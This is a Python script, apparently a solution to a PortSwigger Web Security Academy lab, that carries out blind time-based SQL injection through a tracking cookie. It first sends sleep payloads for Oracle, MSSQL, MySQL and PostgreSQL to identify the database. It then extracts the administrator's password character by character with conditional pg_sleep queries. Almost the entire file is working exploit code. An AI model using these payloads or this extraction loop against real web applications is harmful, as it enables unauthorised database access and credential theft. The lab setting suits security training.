import requests as r
import time
import string


# Lab name: Blind SQL injection with time delays and information retrieval
# lab description : 
# table name users
# column name username,password
# admin name administrator


link="https://0a75004f036954bfc0d8267d00820090.web-security-academy.net"


# oracle:    cookie_user +  "\' || dbms_pipe.receive_message((\'a\'),10) || \'"
# microsoft:       cookie_user  +      \' || (waitfor delay \'0:0:10\')  || \'
#MySQL  :        cookie_user    +      \'   || (SELECT SLEEP(10)) || \'
#PostgreSQL:      cookie_user   +      \' || (select pg_sleep(10)) || \'


cookie_name= "TrackingId"
user_cookie="jNtzUWWpOhCvxnzw"
def found_db(cookie_user):

    payloads=  ["\' ||  (select pg_sleep(10)) || \'" , "\' || (SELECT SLEEP(10)) || \'" , "\' ||  (waitfor delay \'0:0:10\') || \'", "\' || dbms_pipe.receive_message((\'a\'),10) || \'" ]

    for i in range(len(payloads)):
        
        fullpayload = cookie_user + payloads[i]

        print("Test payload : ", fullpayload)
        start_timer = time.time()
        myr =r.get(link, cookies={cookie_name:fullpayload})
        response= myr.text
        calc_time=time.time() - start_timer
        if calc_time >= 10.0 and i==0:
            print("[+] db found : postgresql")
            print(calc_time)
        if calc_time >= 10.0 and i==1:
            print("[+] db found : MySQL")
            print(calc_time)
        if calc_time >= 10.0 and i==2:
            print("[+] db found : Microsoft")
            print(calc_time)
        if calc_time >= 10.0 and i==3:
            print("[+] db found : oracle")
            print(calc_time)

#found_db(user_cookie) # we found the db :  postgresql

# lets use conditional time delays



def dump_admin_password(cookie_user):

    password=""

    alpha_num = string.ascii_lowercase + string.ascii_uppercase + string.digits
    actual_carac=1
    counter=0
    while counter < len(alpha_num):
        for i in alpha_num:
            counter+=1
            payload ="\' || (select case when (substring(password,1," + str(actual_carac) + ")=\'" + password+ i + "\' ) then pg_sleep(5) else pg_sleep(0) end from users where username=\'administrator\' )  || \'"
            full_payload=cookie_user + payload
            #print(payload)
            start_time=time.time()
            myr = r.get(link, cookies={cookie_name:full_payload})
            calc_time= time.time() - start_time
            response = myr.text
            if calc_time >=5.: 
                password+=i
                actual_carac+=1
                counter=0
                print("password: ",password)


dump_admin_password(user_cookie)

# after a few second the password pop



